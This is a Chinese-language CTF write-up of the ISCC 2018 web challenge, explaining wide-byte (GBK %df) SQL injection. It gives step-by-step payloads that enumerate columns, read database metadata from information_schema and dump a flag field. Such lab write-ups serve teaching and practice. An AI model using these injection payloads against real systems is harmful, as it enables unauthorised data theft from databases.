ISCC-2018 web题"SQL注入的艺术" write up

字数统计: 715字   |   阅读时长: 3分
  • CTF-WriteUp

今天做了ISCC2018的CTF，里面有一道宽字节注入的题，讲一下解题思路。

第一步：看题

  • 进去以后有两个界面，一个首页，一个个人信息界面：

  • 在个人信息界面看到?id=1，疑似注入点，单引号闭合一下，没有成功，单引号疑似被转义。极大可能是宽字节注入。

讲一下宽字节注入

  • sql宽字节注入详解

    gbk编码中汉字占两个字节，mysql在使用gbk编码时会认为两个字符是一个汉字（前一个的ascii码值要大于128，才到汉字范围）。当单引号被转义后’就变成了\’,如果我们把单引号改成%df’，转义后就是%df\’,\的ascii码值是5c，gbk编码认为%df%5c是一个汉字，所以单引号逃出转义，我们就能闭合查询语句。注意：虽然gb2312也是宽字节中的一员，但gb2312编码的取值范围高位为0xA1~0xF7，低位为0xA~0xFE,\号不再范围中，所以无法被编码。

尝试宽字节注入

  • 构造payload：1 %df’ and 1=1 %23 和 1 %df’ and 1=2 %23看能否宽字节注入。

  • 1=1逻辑成立，查询成功，有显示内容。1=2逻辑不成立，查询失败，无显示内容。成功将语句插入到查询语句中，宽字节注入可行。

Order by 子句猜查询字段数

  • 构造payload：1 %df’ order by n %23. n从1开始逐渐变大，当n为8时能正常显示，n为9时无显示。说明查询语句查询了8个字段。

判断查询结果输出的位置

  • 构造payload：-1 %df’ union select 1,2,3,4,5,6,7,8 %23. 2、7、4位的信息输出。

开始获得数据库信息

  • 构造payload：-1 %df’ union select 1,database(),3,version(),5,6,7,8 %23 查询当前使用数据库名和版本信息。

  • 数据库名baji，构造payload：-1 %df’ union select 1,group_concat(table_name),3,4,5,6,7,8 from information_schema.tables where table_schema=0x62616A69 %23，查表名（0x62616A69为数据库名的ascii码值)

  • 只有一个admins表，构造payload：-1 %df’ union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=0x62616A69 %23，查字段名。注：按理来说如果不止一张表要确定具体查询的表，完整的是 where table_schema=baji and table_name=admins，但是它只有一个表，我懒得编码表名了。

  • 有个flag的字段名，查一下这个字段下的信息，构造payload：-1 %df’ union select 1,group_concat(flag),3,4,5,6,7,8 from baji.admins %23

  • 出flag,提交成功，题目解出。

总结

题目与一些盲注比起来还是比较简单的，没有什么过滤，也不用写注入脚本，手注就行了。做下来没有什么地方卡住的。还是要继续努力，下次做出一些难题来。
